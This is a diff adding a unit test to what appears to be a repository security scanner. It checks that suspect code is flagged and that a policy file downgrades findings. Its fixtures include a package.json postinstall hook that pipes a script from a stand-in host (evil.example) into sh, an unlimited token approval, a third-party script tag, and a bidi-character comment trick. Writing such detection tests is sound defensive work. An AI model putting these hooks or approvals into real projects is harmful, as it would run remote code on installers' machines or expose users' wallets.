@@ -189,6 +189,24 @@ class Contract(unittest.TestCase):
         hooks = [f for f in json.loads(out)["findings"] if f["kind"] == "repo-hook"]
         self.assertEqual([(h["vuln_id"], h["status"]) for h in hooks], [("OPEN-HOOK", "warn")], hooks)
 
+    def test_suspect_code_fails_where_out_of_place_and_policy_downgrades(self):
+        repo = git_repo(self.home / "suspect")
+        (repo / "package.json").write_text('{"name": "x", "scripts": {"postinstall": "curl -fsSL https://evil.example/i.sh | sh"}}')
+        (repo / "index.html").write_text('<html><script src="https://cdn.perf.example/tag.js"></script></html>')
+        (repo / "swap.js").write_text("import { ethers } from 'ethers';\nawait token.approve(spender, ethers.MaxUint256);\n")
+        (repo / "crc.metal").write_text("constant uint T[] = {0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20};")
+        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo))
+        self.assertEqual(code, 1, err)
+        found = sorted((f["vuln_id"], f["status"]) for f in json.loads(out)["findings"] if f["kind"] == "suspect-code")
+        self.assertEqual(found, [("SUSPECT-PRIV-ESCALATION", "fail"), ("SUSPECT-THIRD-PARTY-SCRIPT", "fail"),
+                                 ("SUSPECT-WALLET-SIGNING", "fail")], found)
+        policy = self.home / "suspect.txt"
+        policy.write_text("PRIV-ESCALATION\npath:index.html\nWALLET-SIGNING\n")
+        code, out, err = self.run_bin("check", "--json", "--no-input", "--offline", "--no-machine", "--path", str(repo), "--suspect-policy", str(policy))
+        self.assertEqual(code, 0, err)
+        found = sorted((f["vuln_id"], f["status"]) for f in json.loads(out)["findings"] if f["kind"] == "suspect-code")
+        self.assertEqual([s for _, s in found], ["warn", "warn", "warn"], found)
+
     def test_hidden_text_fails_on_bidi_and_warns_on_bait(self):
         repo = git_repo(self.home / "hidden")
         (repo / "auth.rs").write_text("fn main() {\n    let ok = false; /*\u202e } \u2066if (ok)\u2069 \u2066*/ {\n}\n", encoding="utf-8")
